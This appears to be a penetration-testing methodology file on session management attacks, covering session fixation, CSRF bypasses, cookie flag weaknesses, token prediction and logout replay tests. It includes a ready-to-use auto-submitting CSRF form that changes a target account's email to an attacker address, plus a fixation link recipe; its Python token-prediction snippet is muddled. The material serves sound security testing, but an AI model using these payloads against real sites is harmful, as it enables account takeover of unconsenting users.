---
name: session-attacks
description: Session management attack methodology. Covers session fixation, CSRF, cookie theft, session prediction, concurrent session abuse, and logout bypass.
version: 1.0.0
license: Apache-2.0
---

# Session Management Attacks

## Session Fixation

```
1. Attacker obtains a pre-auth session token
2. Attacker sends victim a link with the fixed session: https://target.com/login?PHPSESSID=attacker_session
3. Victim logs in — server assigns that session to the authenticated user
4. Attacker uses the same session token to access victim's account
```

**Test:** Check if the session token changes after successful login. No change = likely fixation vulnerability.

## CSRF (Cross-Site Request Forgery)

```html
<!-- Auto-submitting CSRF form hosted on attacker.com -->
<form id="csrf" action="https://target.com/api/change-email" method="POST">
  <input name="email" value="attacker@attacker.com">
</form>
<script>document.getElementById('csrf').submit();</script>
```

**CSRF bypass techniques:**
- No CSRF token: attack directly
- CSRF token not tied to session: reuse your own valid token
- Referrer check bypass: send from target.com subdomain (open redirect) or remove Referer header
- Token in URL: change to POST and test if GET token accepted
- SameSite=Lax: CSRF via top-level GET navigation with side effects

## Cookie Security Analysis

```
Secure flag:   Missing → token sent over HTTP → interception risk
HttpOnly flag: Missing → token accessible via XSS → document.cookie
SameSite:      None → CSRF from cross-origin → test CSRF attacks
Domain:        .target.com → token sent to all subdomains → subdomain takeover → session theft
Expiry:        No expiry → session persists indefinitely after logout
```

## Session Prediction

```python
# Test for weak session tokens
import requests, hashlib, time

for i in range(100):
    r = requests.get("https://target.com/login")
    token = r.cookies.get('SESSID')
    # Check if token is time-based, sequential, or MD5/SHA1 of predictable input
    print(hashlib.md5(str(time.time()).encode()).hexdigest())
```

## Concurrent Session Abuse

1. Log in as user A — note session token A
2. Log in again as user A — note session token B
3. Try to use token A after token B is issued
4. If token A still works: no concurrent session control
5. Impact: attacker can maintain persistent access even after victim logs out

## Forced Logout Testing

1. Log in; note session token
2. Log out
3. Replay the session token in a subsequent request
4. If request succeeds: session not invalidated on logout

## Tools

- Burp Suite — session analysis, CSRF POC generator
- [CSRF-Tester](https://owasp.org/www-project-csrf-tester/)
- Browser dev tools — inspect cookie attributes

## OWASP Mapping

- A07:2021 — Identification and Authentication Failures
- A01:2021 — Broken Access Control (CSRF)
